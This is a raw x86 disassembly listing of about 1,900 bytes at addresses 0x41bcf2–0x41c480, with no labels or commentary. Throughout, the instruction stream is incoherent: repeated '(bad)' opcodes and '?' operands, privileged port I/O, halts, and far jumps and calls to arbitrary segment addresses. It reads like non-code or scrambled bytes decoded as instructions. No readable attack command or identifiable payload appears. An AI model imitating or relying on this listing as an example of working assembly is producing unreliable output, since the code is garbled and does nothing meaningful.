  41bcf2:	mov    edi,0x8d0ab84a
  41bcf7:	stos   BYTE PTR es:[edi],al
  41bcf8:	xchg   ecx,eax
  41bcf9:	pop    ss
  41bcfa:	mov    ecx,0x1998d1b2
  41bcff:	shr    DWORD PTR fs:[esi-0x56],cl
  41bd03:	stc    
  41bd04:	in     al,dx
  41bd05:	cli    
  41bd06:	pop    ss
  41bd07:	mov    ds:0xd1fa0b49,al
  41bd0c:	nop
  41bd0d:	cdq    
  41bd0e:	scas   al,BYTE PTR es:[edi]
  41bd0f:	adc    eax,0x88b129db
  41bd14:	mov    ?,WORD PTR [edx-0x5fe1517c]
  41bd1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd1b:	add    DWORD PTR [edx],0x79
  41bd1e:	push   esi
  41bd1f:	dec    edi
  41bd20:	jno    0x41bd6b
  41bd22:	sub    ah,0xeb
  41bd25:	daa    
  41bd26:	pop    ds
  41bd27:	popa   
  41bd28:	pop    eax
  41bd29:	dec    eax
  41bd2a:	addr16 cmp al,0x81
  41bd2d:	lds    edx,FWORD PTR [ecx-0xccc98b3]
  41bd33:	jle    0x41bd62
  41bd35:	imul   ebx,esp,0xfffffffe
  41bd38:	mov    es,ebx
  41bd3a:	fisttp DWORD PTR [ecx+0x3187f545]
  41bd40:	push   es
  41bd41:	ja     0x41bdb3
  41bd43:	jmp    0x41bcdc
  41bd45:	inc    ebx
  41bd46:	into   
  41bd47:	mov    dh,0x61
  41bd49:	ins    BYTE PTR es:[edi],dx
  41bd4a:	add    DWORD PTR [edx-0x3c302c01],edi
  41bd50:	inc    ecx
  41bd51:	xchg   ebp,eax
  41bd52:	maskmovq mm5,(bad)
  41bd53:	imul   DWORD PTR [ecx+0x40]
  41bd56:	mov    bl,0xa0
  41bd58:	(bad)  
  41bd59:	test   eax,0x70abccac
  41bd5e:	mov    ecx,0x86ad7e80
  41bd63:	ins    BYTE PTR es:[edi],dx
  41bd64:	jo     0x41bd81
  41bd66:	call   DWORD PTR [ebp+0x1c904d82]
  41bd6c:	cli    
  41bd6d:	fadd   DWORD PTR [esi-0x60]
  41bd70:	shl    DWORD PTR ds:0xce6a547d,0xc6
  41bd77:	ins    BYTE PTR es:[edi],dx
  41bd78:	add    ebp,ebp
  41bd7a:	fwait
  41bd7b:	xchg   BYTE PTR [edx],bl
  41bd7d:	lods   eax,DWORD PTR ds:[esi]
  41bd7e:	retf   
  41bd7f:	inc    edx
  41bd80:	adc    edi,DWORD PTR [ecx+0x54]
  41bd83:	fild   DWORD PTR [esi]
  41bd85:	adc    ch,BYTE PTR [ebx-0x79]
  41bd88:	inc    edi
  41bd89:	push   ds
  41bd8a:	sbb    BYTE PTR [edx-0x52],ah
  41bd8d:	dec    BYTE PTR [edx+0x69fb8f54]
  41bd93:	mov    esp,0x1209be24
  41bd98:	retf   
  41bd99:	in     eax,dx
  41bd9a:	mov    ebx,0x7061720a
  41bd9f:	sub    BYTE PTR [eax-0x6827fa23],dh
  41bda5:	pushf  
  41bda6:	cmc    
  41bda7:	mov    ch,0xbc
  41bda9:	aaa    
  41bdaa:	jnp    0x41be1a
  41bdac:	push   esp
  41bdad:	and    cl,ah
  41bdaf:	mov    bh,0xf5
  41bdb1:	mov    edx,0x817a330a
  41bdb6:	or     al,0x86
  41bdb8:	(bad)  
  41bdb9:	mov    es:0xc88a35d0,eax
  41bdbf:	sar    BYTE PTR [ecx-0x6e],cl
  41bdc2:	fnstsw WORD PTR [edx]
  41bdc4:	data16 sbb BYTE PTR [edi+0x5f],bh
  41bdc8:	inc    ebx
  41bdc9:	(bad)  
  41bdca:	or     DWORD PTR [ebp+0x0],edi
  41bdcd:	sbb    BYTE PTR ds:0x65040ce6,ch
  41bdd3:	pop    ebx
  41bdd4:	cmc    
  41bdd5:	mov    ah,0x2e
  41bdd7:	jnp    0x41bdad
  41bdd9:	mov    ebx,0xd6596b8d
  41bdde:	jl     0x41be24
  41bde0:	dec    ebp
  41bde1:	mov    ch,0xf1
  41bde3:	lods   al,BYTE PTR ds:[esi]
  41bde4:	shl    edx,cl
  41bde6:	and    BYTE PTR [ecx-0x134a08ed],ah
  41bdec:	adc    DWORD PTR [eax+0x68],edx
  41bdef:	fist   DWORD PTR [ebx-0x2a]
  41bdf2:	sbb    bl,BYTE PTR [ecx-0x33a5c18c]
  41bdf8:	int3   
  41bdf9:	daa    
  41bdfa:	cld    
  41bdfb:	push   ecx
  41bdfc:	sbb    al,0xe4
  41bdfe:	mov    ds:0x8395c160,al
  41be03:	sbb    eax,0x63c0f66f
  41be08:	sub    eax,0xf277a4be
  41be0d:	retf   
  41be0e:	and    eax,0x924548de
  41be13:	pop    esp
  41be14:	je     0x41be5c
  41be16:	das    
  41be17:	mov    edx,0xe794f60f
  41be1c:	xlat   BYTE PTR ds:[ebx]
  41be1d:	aaa    
  41be1e:	jmp    0xe227ff54
  41be23:	adc    al,0xa4
  41be25:	pop    ss
  41be26:	mov    cl,bl
  41be28:	retf   
  41be29:	fcomip st,st(5)
  41be2b:	retf   
  41be2c:	(bad)  
  41be2d:	je     0x41be0d
  41be2f:	ja     0x41bdbf
  41be31:	in     eax,0x8f
  41be33:	cld    
  41be34:	stos   DWORD PTR es:[edi],eax
  41be35:	xor    edx,DWORD PTR [edi+0x48]
  41be38:	cld    
  41be39:	and    dh,cl
  41be3b:	jno    0x41be26
  41be3d:	fs add eax,0x76992abe
  41be43:	jge    0x41beba
  41be45:	hlt    
  41be46:	xor    DWORD PTR [edi+0x53c45415],ecx
  41be4c:	sbb    al,0xda
  41be4e:	add    BYTE PTR [esi-0x3a],0xb9
  41be52:	lods   al,BYTE PTR ds:[esi]
  41be53:	mov    ?,ebp
  41be55:	sar    DWORD PTR [ebp+0x1c13c5f2],1
  41be5b:	pop    esp
  41be5c:	add    eax,0x48140176
  41be61:	popa   
  41be62:	cmp    eax,0x16501f69
  41be67:	lds    edi,FWORD PTR [eax]
  41be69:	pushf  
  41be6a:	push   ss
  41be6b:	sbb    edi,DWORD PTR [edi-0x43c03252]
  41be71:	leave  
  41be72:	das    
  41be73:	xchg   ecx,eax
  41be74:	or     al,0x3a
  41be76:	inc    esp
  41be77:	mov    dh,0x54
  41be79:	data16 mov cl,0xbe
  41be7c:	loope  0x41bea4
  41be7e:	inc    edx
  41be7f:	clc    
  41be80:	ds xchg edx,eax
  41be82:	pop    edi
  41be83:	inc    esp
  41be84:	push   0xdec71814
  41be89:	test   eax,0x788ba760
  41be8e:	mov    ds:0x75cc14a9,al
  41be93:	mov    edi,0xaca6972d
  41be98:	stos   BYTE PTR es:[edi],al
  41be99:	popf   
  41be9a:	fwait
  41be9b:	push   es
  41be9c:	mov    esp,0xa31cc10b
  41bea1:	neg    dl
  41bea3:	int    0x40
  41bea5:	ret    
  41bea6:	cmp    DWORD PTR [edx-0x244dc81f],eax
  41beac:	and    al,dh
  41beae:	xchg   ecx,eax
  41beaf:	cmp    eax,esi
  41beb1:	xchg   edx,eax
  41beb2:	les    edi,FWORD PTR [eax-0x3a7da4c1]
  41beb8:	iret   
  41beb9:	test   BYTE PTR [edx+edi*2],al
  41bebc:	leave  
  41bebd:	sub    eax,0x8ad4266
  41bec2:	jecxz  0x41bee5
  41bec4:	imul   ecx,DWORD PTR [ecx+0x304b5243],0x142aa3ba
  41bece:	jg     0x41bee6
  41bed0:	pop    esi
  41bed1:	call   DWORD PTR [edi+0x2d0a0f6c]
  41bed7:	xchg   BYTE PTR [edx+ebx*2+0x79],al
  41bedb:	hlt    
  41bedc:	shl    BYTE PTR [eax+0x3f0a5473],cl
  41bee2:	les    esi,FWORD PTR [edi-0x62]
  41bee5:	pop    eax
  41bee6:	bound  ecx,QWORD PTR ds:[esi]
  41bee9:	add    al,dh
  41beeb:	mov    dh,0xc7
  41beed:	lods   eax,DWORD PTR ds:[esi]
  41beee:	cmp    ah,BYTE PTR [eax-0x1b]
  41bef1:	push   esi
  41bef2:	les    edi,FWORD PTR [edi]
  41bef4:	mov    bl,0x50
  41bef6:	ror    DWORD PTR [edx],cl
  41bef8:	xchg   ebp,eax
  41bef9:	div    DWORD PTR [esi+0x74]
  41befc:	inc    esp
  41befd:	in     al,dx
  41befe:	nop
  41beff:	or     DWORD PTR [esi],edx
  41bf01:	ins    DWORD PTR es:[edi],dx
  41bf02:	rol    al,1
  41bf04:	imul   esi,DWORD PTR [edi+ecx*1],0x70371860
  41bf0b:	icebp  
  41bf0c:	rcl    BYTE PTR [ebx],1
  41bf0e:	mov    edi,0x8a7cfa18
  41bf13:	add    al,0xa8
  41bf15:	cdq    
  41bf16:	or     esi,0xb1cdae3
  41bf1c:	enter  0xcf31,0x2a
  41bf20:	xchg   esp,eax
  41bf21:	mov    es,edx
  41bf23:	cmp    ah,BYTE PTR [ecx+0x34]
  41bf26:	dec    ecx
  41bf27:	lods   eax,DWORD PTR ds:[esi]
  41bf28:	iret   
  41bf29:	and    eax,0x367cd8bd
  41bf2e:	add    BYTE PTR ds:0x15e4ecdc,0x25
  41bf36:	push   cs
  41bf37:	dec    ebx
  41bf38:	aam    0x6d
  41bf3a:	sub    eax,0x2d64c4b
  41bf3f:	std    
  41bf40:	push   eax
  41bf41:	stc    
  41bf42:	cmp    eax,eax
  41bf44:	jae    0x41bee9
  41bf46:	push   0xfffffffb
  41bf48:	fadd   DWORD PTR [eax-0x3511e6bb]
  41bf4e:	outs   dx,BYTE PTR ds:[esi]
  41bf4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf50:	add    ecx,edi
  41bf52:	loope  0x41bf99
  41bf54:	loopne 0x41bfa8
  41bf56:	adc    cl,BYTE PTR [ebx-0x23]
  41bf59:	jmp    0xf75f:0xf2659e8a
  41bf60:	fisttp QWORD PTR [edx]
  41bf62:	add    DWORD PTR [eax+0x5405e29d],esi
  41bf68:	ror    BYTE PTR ds:0x9e5e77e3,cl
  41bf6e:	(bad)  
  41bf70:	xor    al,0x19
  41bf72:	mov    bl,bh
  41bf74:	pop    esp
  41bf75:	fidiv  WORD PTR ds:[edx+0x47]
  41bf79:	lds    esi,FWORD PTR [esi+eiz*4+0x1a]
  41bf7d:	les    ebx,FWORD PTR [ebp+0x6b23b4be]
  41bf83:	sbb    al,0xe7
  41bf85:	psubsb mm7,QWORD PTR [eax-0x337a8ef9]
  41bf8c:	lods   al,BYTE PTR ds:[esi]
  41bf8d:	addr16 pop esi
  41bf8f:	pop    ecx
  41bf90:	imul   ecx,esi,0x145dd835
  41bf96:	stos   BYTE PTR es:[edi],al
  41bf97:	jnp    0x41bfd0
  41bf99:	ret    0xf6ca
  41bf9c:	lock ins DWORD PTR es:[edi],dx
  41bf9e:	lds    ebp,FWORD PTR [edx]
  41bfa0:	xacquire xchg DWORD PTR [edx],esi
  41bfa3:	pop    edx
  41bfa4:	ja     0x41c017
  41bfa6:	fidivr DWORD PTR [esi+0x64e48597]
  41bfac:	scas   al,BYTE PTR es:[edi]
  41bfad:	in     al,dx
  41bfae:	in     eax,dx
  41bfaf:	sbb    edi,0x4da91c34
  41bfb5:	jmp    0x41bf88
  41bfb7:	or     BYTE PTR [ebp-0x34],0x7e
  41bfbb:	cmp    al,0x29
  41bfbd:	dec    ebx
  41bfbe:	pop    edx
  41bfbf:	mov    ecx,0xb8383245
  41bfc4:	xor    BYTE PTR [edi-0x6b],0x2d
  41bfc8:	popa   
  41bfc9:	aam    0xa5
  41bfcb:	add    DWORD PTR [esi+ecx*8-0x54bdf4c7],0x45
  41bfd3:	push   eax
  41bfd4:	and    BYTE PTR [edx],ch
  41bfd6:	cmp    al,0xc8
  41bfd8:	cmp    esi,DWORD PTR [edi]
  41bfda:	mov    WORD PTR [edx+0x31e89d38],cs
  41bfe0:	scas   eax,DWORD PTR es:[edi]
  41bfe1:	bound  esi,QWORD PTR [eax+0x31]
  41bfe4:	mov    edx,DWORD PTR [ebx+0x11]
  41bfe7:	or     BYTE PTR [esi],bh
  41bfe9:	cli    
  41bfea:	out    0x83,eax
  41bfec:	dec    edi
  41bfed:	mov    ds:0xc8c44175,eax
  41bff2:	xor    eax,0xcdcb3e5d
  41bff7:	popa   
  41bff8:	fsubr  DWORD PTR [ecx]
  41bffa:	mov    ss,WORD PTR [ebp+0xa]
  41bffd:	fimul  WORD PTR [edx+0x79]
  41c000:	retf   
  41c001:	scas   eax,DWORD PTR es:[edi]
  41c002:	rsqrtps xmm0,XMMWORD PTR fs:0x6a3f4a3a
  41c00a:	pop    ds
  41c00b:	push   cs
  41c00c:	lahf   
  41c00d:	or     BYTE PTR [edi],bh
  41c00f:	push   ecx
  41c010:	dec    eax
  41c011:	pushf  
  41c012:	fild   QWORD PTR [edi+0x36]
  41c015:	inc    eax
  41c016:	inc    ebp
  41c017:	out    dx,eax
  41c018:	xchg   esi,eax
  41c019:	aad    0x73
  41c01b:	and    eax,DWORD PTR [ebp+0x78f37794]
  41c021:	or     BYTE PTR [ebx],dl
  41c023:	aaa    
  41c024:	icebp  
  41c025:	cmp    eax,edi
  41c027:	frstor [ecx+0x659fc354]
  41c02d:	sub    DWORD PTR [edi-0x50],ebx
  41c030:	mov    al,ds:0xfc7f4769
  41c035:	retf   
  41c036:	inc    esi
  41c037:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c038:	test   al,0x8c
  41c03a:	shl    BYTE PTR [ecx],1
  41c03c:	sbb    ebp,0xffffff8d
  41c03f:	mov    dh,0xc2
  41c041:	add    eax,DWORD PTR [eax+0x5]
  41c044:	ds cs (bad) 
  41c047:	pusha  
  41c048:	loope  0x41bfee
  41c04a:	mov    edi,DWORD PTR [ebp-0x7ca73ef6]
  41c050:	inc    esi
  41c051:	js     0x41bffd
  41c053:	sahf   
  41c054:	and    ah,BYTE PTR [edx+0x67]
  41c057:	(bad)  
  41c058:	das    
  41c059:	jmp    0x98b19989
  41c05e:	and    dl,BYTE PTR [eax-0x1d2c8771]
  41c064:	sbb    bl,BYTE PTR [eax+edi*8-0xc35d315]
  41c06b:	dec    edx
  41c06c:	xor    ebx,DWORD PTR [ebp-0x2a5d04f5]
  41c072:	lods   eax,DWORD PTR ds:[esi]
  41c073:	and    bh,dh
  41c075:	jle    0x41c08c
  41c077:	sbb    BYTE PTR [ebp-0x3f],ch
  41c07a:	aad    0xd3
  41c07c:	jl     0x41c07e
  41c07e:	add    BYTE PTR [eax],al
  41c080:	add    BYTE PTR [eax],al
  41c082:	mov    dh,0x3a
  41c084:	out    0x1,eax
  41c086:	out    dx,eax
  41c087:	(bad)  
  41c089:	mov    edi,0xdf2dff43
  41c08e:	push   ecx
  41c08f:	test   DWORD PTR [esi-0x71],eax
  41c092:	push   0xf300013c
  41c097:	add    al,0x0
  41c099:	add    BYTE PTR [edi],dh
  41c09b:	rcl    BYTE PTR [ecx-0x3f11e702],cl
  41c0a1:	dec    esi
  41c0a2:	mov    WORD PTR [edx+ebx*4-0x3b12aa5c],?
  41c0a9:	in     eax,dx
  41c0aa:	sahf   
  41c0ab:	arpl   WORD PTR [ecx-0xe],cx
  41c0ae:	and    al,0xcb
  41c0b0:	xchg   ebx,eax
  41c0b1:	push   edi
  41c0b2:	jecxz  0x41c0cc
  41c0b4:	aas    
  41c0b5:	mul    esi
  41c0b7:	mov    eax,ds:0x1f452961
  41c0bc:	fdiv   st,st(2)
  41c0be:	pop    edx
  41c0bf:	jmp    0x41c138
  41c0c1:	(bad)  
  41c0c2:	int    0x47
  41c0c4:	loopne 0x41c0a1
  41c0c6:	stc    
  41c0c7:	loope  0x41c095
  41c0c9:	xor    ecx,DWORD PTR [edx+0x70d827b8]
  41c0cf:	cmp    esp,ebx
  41c0d1:	test   al,0xd4
  41c0d3:	and    eax,0x905d18cc
  41c0d8:	clc    
  41c0d9:	test   BYTE PTR [edi],0xa6
  41c0dc:	fldln2 
  41c0de:	arpl   WORD PTR [ebp+ebp*8+0x21],ax
  41c0e2:	sbb    al,0x88
  41c0e4:	mov    bh,0x8b
  41c0e6:	or     edx,DWORD PTR [edx+ecx*2+0x36373299]
  41c0ed:	push   ecx
  41c0ee:	and    DWORD PTR [eax+0x17],eax
  41c0f1:	int3   
  41c0f2:	(bad)  
  41c0f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0f4:	push   edx
  41c0f5:	popf   
  41c0f6:	arpl   WORD PTR [esi+0x88d92b8],cx
  41c0fc:	mov    ebx,0x51763a19
  41c101:	dec    ecx
  41c102:	pusha  
  41c103:	sub    cl,bh
  41c105:	jle    0x41c154
  41c107:	jb     0x41c14a
  41c109:	push   ebx
  41c10a:	xlat   BYTE PTR ds:[ebx]
  41c10b:	stos   DWORD PTR es:[edi],eax
  41c10c:	daa    
  41c10d:	inc    edx
  41c10e:	lea    ebp,[edx]
  41c110:	sbb    DWORD PTR [ebp-0x4c9187a0],0x64
  41c117:	mov    al,ds:0x89d4878f
  41c11c:	imul   ebp,DWORD PTR [ecx],0x3
  41c11f:	push   ss
  41c120:	in     al,0x83
  41c122:	add    ebx,DWORD PTR [esi]
  41c124:	fsubr  DWORD PTR [edx+0x77a495ee]
  41c12a:	mov    gs,WORD PTR [ebx+esi*8+0xca3416c]
  41c131:	inc    ebx
  41c132:	(bad)  
  41c133:	out    0x8a,al
  41c135:	inc    ecx
  41c136:	sub    eax,ecx
  41c138:	lods   eax,DWORD PTR ds:[esi]
  41c139:	mov    ecx,0x5660e53a
  41c13e:	fadd   QWORD PTR [eax]
  41c140:	xchg   ebx,eax
  41c141:	push   es
  41c142:	loop   0x41c161
  41c144:	call   DWORD PTR [ecx]
  41c146:	test   DWORD PTR [esi-0x45],esp
  41c149:	jmp    0x41c17c
  41c14b:	hlt    
  41c14c:	ja     0x41c1b6
  41c14e:	inc    ebp
  41c14f:	adc    DWORD PTR [edi-0x27],0xfffffff4
  41c153:	pop    ecx
  41c154:	pop    esp
  41c155:	(bad)  
  41c156:	retf   
  41c157:	jne    0x41c1b7
  41c159:	add    DWORD PTR [edx-0x2d],eax
  41c15c:	dec    ebx
  41c15d:	cdq    
  41c15e:	daa    
  41c15f:	lds    esp,FWORD PTR [ebp+0x40]
  41c162:	ja     0x41c19a
  41c164:	mov    ss,WORD PTR [edx+edi*4+0x6c]
  41c168:	addr16 jmp 0x6fb6:0x787ffd7f
  41c170:	stos   DWORD PTR es:[edi],eax
  41c171:	and    al,0x38
  41c173:	add    eax,0xdc5e6900
  41c178:	jmp    0xb276:0xc5bad61
  41c17f:	sub    ebx,esp
  41c181:	je     0x41c1d5
  41c183:	mov    ah,0x75
  41c185:	lods   al,BYTE PTR ds:[esi]
  41c186:	out    0x68,eax
  41c188:	(bad)  [eax+edi*4+0x60087de]
  41c18f:	cdq    
  41c190:	adc    eax,0xbd27bf3d
  41c195:	dec    ebp
  41c196:	cld    
  41c197:	push   ebp
  41c198:	and    DWORD PTR [esp+ecx*4],esi
  41c19b:	(bad)  
  41c19c:	aaa    
  41c19d:	cmc    
  41c19e:	fbld   TBYTE PTR [ecx-0x4703b64e]
  41c1a4:	and    edi,DWORD PTR [edi]
  41c1a6:	out    dx,al
  41c1a7:	mov    eax,0x2962ea6f
  41c1ac:	xchg   BYTE PTR [eax+0x4f496af0],bh
  41c1b2:	push   ss
  41c1b3:	mov    ds:0x382e5796,al
  41c1b8:	add    bh,bh
  41c1ba:	or     eax,0x50dde16f
  41c1bf:	mov    eax,ds:0x1d85d1ea
  41c1c4:	sbb    BYTE PTR [ecx],dl
  41c1c6:	sbb    eax,0xe2d4cc78
  41c1cb:	pop    edx
  41c1cc:	xchg   ebp,eax
  41c1cd:	mov    esp,0x1562869d
  41c1d2:	jo     0x41c22b
  41c1d4:	xchg   ecx,eax
  41c1d5:	iret   
  41c1d6:	mov    edi,0xd14d37e5
  41c1db:	test   BYTE PTR [esi-0x6f],0xb
  41c1df:	xor    eax,0x84fc70fd
  41c1e4:	adc    esp,DWORD PTR [edi+0x6d]
  41c1e7:	push   cs
  41c1e8:	test   eax,0x6277ab89
  41c1ed:	jns    0x41c1b7
  41c1ef:	xchg   esi,eax
  41c1f0:	imul   eax,DWORD PTR [ebp+eiz*2+0x76],0x2a027535
  41c1f8:	call   0x2c6d:0x9c65e3c6
  41c1ff:	fadd   DWORD PTR [esi+edx*4-0x4b4083b1]
  41c206:	xchg   ebx,eax
  41c207:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c208:	jbe    0x41c1bb
  41c20a:	and    eax,0x36a62bb1
  41c20f:	imul   eax,ebp,0x21534024
  41c215:	aad    0xad
  41c217:	adc    edx,DWORD PTR [edi-0x7b]
  41c21a:	sub    BYTE PTR [esi-0x16],al
  41c21d:	adc    eax,0xb72a0131
  41c222:	test   al,0xbb
  41c224:	mov    al,0xcc
  41c226:	fs out dx,al
  41c228:	mov    WORD PTR [eax-0x526fbe31],ds
  41c22e:	add    DWORD PTR [esi-0x47],edi
  41c231:	xchg   esi,eax
  41c232:	aaa    
  41c233:	adc    edx,DWORD PTR [esi+edi*2-0x5f]
  41c237:	jl     0x41c258
  41c239:	xor    eax,0x839ca43e
  41c23e:	pop    eax
  41c23f:	clc    
  41c240:	rcl    DWORD PTR [edi],0x8a
  41c243:	test   BYTE PTR [edx-0x22],bl
  41c246:	pop    ecx
  41c247:	adc    al,0xeb
  41c249:	jmp    0x41c207
  41c24b:	cmp    BYTE PTR ds:0x264928d5,ah
  41c251:	repnz dec eax
  41c253:	adc    ch,0xe
  41c256:	mov    esi,0x5405605a
  41c25b:	sti    
  41c25c:	lds    eax,FWORD PTR [ebx-0x20]
  41c25f:	lahf   
  41c260:	adc    ebp,DWORD PTR [eax+0x2e2e586b]
  41c266:	push   0xf0782bdb
  41c26b:	jne    0x41c232
  41c26d:	dec    eax
  41c26e:	ss stos BYTE PTR es:[edi],al
  41c270:	xor    eax,0x5da8ab3
  41c275:	stc    
  41c276:	das    
  41c277:	out    dx,al
  41c278:	es jae 0x41c25d
  41c27b:	test   DWORD PTR [ebx+0x687a7a8c],ebp
  41c281:	xor    eax,0x95ee897c
  41c286:	sbb    BYTE PTR [ecx-0x4c6cfdf7],ch
  41c28c:	xor    BYTE PTR [edx],bh
  41c28e:	cs xor edx,0xccafecb
  41c295:	in     al,0xef
  41c297:	sbb    BYTE PTR [edi-0x3d],bh
  41c29a:	xor    eax,0xdfafbbde
  41c29f:	xor    ecx,DWORD PTR [esi]
  41c2a1:	ret    
  41c2a2:	cs jge 0x41c28c
  41c2a5:	mov    BYTE PTR [ecx],al
  41c2a7:	push   es
  41c2a8:	sub    BYTE PTR [esi+0x191505a0],ah
  41c2ae:	and    BYTE PTR [eax+0x56],0xef
  41c2b2:	into   
  41c2b3:	inc    edi
  41c2b4:	and    ebx,edx
  41c2b6:	cld    
  41c2b7:	jp     0x41c29f
  41c2b9:	in     al,dx
  41c2ba:	popa   
  41c2bb:	ins    BYTE PTR es:[edi],dx
  41c2bc:	xchg   edi,eax
  41c2bd:	imul   ecx,DWORD PTR [ecx+0x50],0xd8f4fcb9
  41c2c4:	daa    
  41c2c5:	push   ecx
  41c2c6:	fst    st(7)
  41c2c8:	mov    ch,0x42
  41c2ca:	jb     0x41c339
  41c2cc:	push   es
  41c2cd:	pop    ebp
  41c2ce:	push   0x8771de26
  41c2d3:	pop    es
  41c2d4:	jge    0x41c2c5
  41c2d6:	ds adc eax,0x15569f13
  41c2dc:	jns    0x41c2cc
  41c2de:	inc    esi
  41c2df:	push   ebp
  41c2e0:	pop    edx
  41c2e1:	mov    fs,WORD PTR [ebp+0x647f7723]
  41c2e7:	ins    BYTE PTR es:[edi],dx
  41c2e8:	les    eax,FWORD PTR [edi]
  41c2ea:	rol    edi,1
  41c2ec:	xor    BYTE PTR [edx-0x52],bh
  41c2ef:	int    0x24
  41c2f1:	scas   al,BYTE PTR es:[edi]
  41c2f2:	je     0x41c284
  41c2f4:	inc    esp
  41c2f5:	stos   BYTE PTR es:[edi],al
  41c2f6:	int    0xd4
  41c2f8:	or     al,0x28
  41c2fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c2fb:	rcr    BYTE PTR [edx-0x415be809],cl
  41c301:	or     al,0x78
  41c303:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c304:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c305:	sub    eax,0xe05d2141
  41c30a:	and    eax,0xca4d122f
  41c30f:	adc    DWORD PTR [esi-0x35],edx
  41c312:	push   ss
  41c313:	push   ds
  41c314:	add    al,0xa9
  41c316:	sub    BYTE PTR [ebx],al
  41c318:	xor    BYTE PTR [esi+0x60],al
  41c31b:	mov    edx,0x3f50f92c
  41c320:	push   eax
  41c321:	shl    BYTE PTR [ebx],0x47
  41c324:	ss std 
  41c326:	mov    WORD PTR [ecx-0x74],es
  41c329:	in     al,0x2
  41c32b:	push   ss
  41c32c:	inc    ebx
  41c32d:	fcmovnu st,st(2)
  41c32f:	loop   0x41c3a7
  41c331:	pop    ecx
  41c332:	mov    al,0x98
  41c334:	aam    0xc7
  41c336:	mov    edi,0x44cc0639
  41c33b:	call   0x334c:0x19d7a9d1
  41c342:	imul   ecx,DWORD PTR [ebp+0x12],0xffffffc8
  41c346:	mov    BYTE PTR [edi],ah
  41c348:	and    al,0x7a
  41c34b:	sub    ebx,DWORD PTR [eax+0x2a]
  41c34e:	mov    al,0x13
  41c350:	jns    0x41c38a
  41c352:	dec    esp
  41c353:	loop   0x41c38c
  41c355:	daa    
  41c356:	push   0x715b7e78
  41c35b:	inc    eax
  41c35c:	push   ss
  41c35d:	sar    BYTE PTR [eax+0xabd3b4f],cl
  41c363:	popf   
  41c364:	loop   0x41c300
  41c366:	add    bl,BYTE PTR [ebp-0x21]
  41c369:	dec    ebp
  41c36a:	xor    BYTE PTR [ecx],cl
  41c36c:	out    0x5e,eax
  41c36e:	or     dh,bh
  41c370:	add    al,0x36
  41c372:	aas    
  41c373:	sub    eax,0x465a54b
  41c378:	iret   
  41c379:	icebp  
  41c37a:	fwait
  41c37b:	cmp    esi,0xffffffb8
  41c37e:	or     eax,0x92ef93e
  41c383:	jae    0x41c3f7
  41c385:	inc    ebp
  41c386:	xchg   DWORD PTR [ebx],eax
  41c388:	sti    
  41c389:	sbb    BYTE PTR [ecx],ch
  41c38b:	mov    edi,DWORD PTR [ecx]
  41c38d:	add    al,ah
  41c38f:	mov    ah,0x24
  41c391:	mov    edi,0xd815c940
  41c396:	repz arpl WORD PTR gs:[esi],sp
  41c39a:	out    dx,eax
  41c39b:	arpl   WORD PTR [esi+0x5a],sp
  41c39e:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3a0:	mov    edi,0xe726fd80
  41c3a5:	je     0x41c35d
  41c3a7:	xor    eax,0x98100dd6
  41c3ac:	pop    esp
  41c3ad:	outs   dx,BYTE PTR ds:[esi]
  41c3ae:	mov    al,ds:0x5150cdbf
  41c3b3:	(bad)
  41c3b6:	inc    ebx
  41c3b7:	ror    BYTE PTR [ecx-0x9bb6e04],cl
  41c3bd:	call   0x5053:0x7ada06b8
  41c3c4:	xchg   esi,eax
  41c3c5:	push   es
  41c3c6:	test   eax,0x2b119b54
  41c3cb:	sti    
  41c3cc:	sbb    ecx,esi
  41c3ce:	jg     0x41c383
  41c3d0:	dec    edi
  41c3d1:	fdivrp st(7),st
  41c3d3:	lods   eax,DWORD PTR ds:[esi]
  41c3d4:	in     eax,0xd
  41c3d6:	call   0xed4b:0xb27a4055
  41c3dd:	and    al,0x4e
  41c3df:	lea    ecx,[eax+0x2b72783e]
  41c3e5:	fmul   st,st(1)
  41c3e7:	cdq    
  41c3e8:	cmp    esp,DWORD PTR [ebp+0x7e]
  41c3eb:	in     eax,dx
  41c3ec:	int    0x2f
  41c3ee:	clc    
  41c3ef:	ja     0x41c3db
  41c3f1:	sub    ecx,DWORD PTR [eax-0x1b]
  41c3f4:	ds jns 0x41c421
  41c3f7:	(bad)  
  41c3f8:	or     ebx,DWORD PTR [ecx+0x1062337e]
  41c3fe:	dec    edx
  41c3ff:	(bad)  
  41c400:	cmp    cl,cl
  41c402:	jmp    0x4ae5:0x299c9998
  41c409:	aad    0x52
  41c40b:	cmp    DWORD PTR ds:0xf09caba1,0xffffffc4
  41c412:	xor    al,0xcc
  41c414:	imul   esp,DWORD PTR [edi+0x26],0xffffffff
  41c418:	aad    0xf3
  41c41a:	and    BYTE PTR [ecx-0x66],0xa2
  41c41e:	sbb    dl,BYTE PTR [ebx+0x6b]
  41c421:	push   edx
  41c422:	inc    esi
  41c423:	add    al,BYTE PTR [esi]
  41c425:	adc    al,0xa1
  41c427:	cmp    ebp,DWORD PTR [ebp-0x3061da4b]
  41c42d:	loope  0x41c4ae
  41c42f:	mov    edx,0xa49e9627
  41c434:	fild   WORD PTR [edi-0x2a024d95]
  41c43a:	aas    
  41c43b:	mov    esp,0xf79a0197
  41c440:	fcom   QWORD PTR [ebp-0x3641029b]
  41c446:	inc    edi
  41c447:	or     al,0xa2
  41c449:	push   ebx
  41c44a:	int3   
  41c44b:	stos   BYTE PTR es:[edi],al
  41c44c:	aas    
  41c44d:	mov    dl,0xae
  41c44f:	dec    BYTE PTR ds:0x31460bb0
  41c455:	pop    ss
  41c456:	out    0x2e,eax
  41c458:	popf   
  41c459:	in     al,0x39
  41c45b:	or     al,0xd
  41c45d:	cmp    al,BYTE PTR [ebx-0x67]
  41c460:	fcom   QWORD PTR [ebp+0x6fd2d73d]
  41c466:	inc    eax
  41c467:	jnp    0x41c48d
  41c469:	lea    edi,[eax+0x24ab2c80]
  41c46f:	mov    edi,0xee51e9b2
  41c475:	pop    ebx
  41c476:	cs mov ah,0xe3
  41c479:	mov    al,ds:0x76497937
  41c47e:	jl     0x41c44e
  41c480:	das    
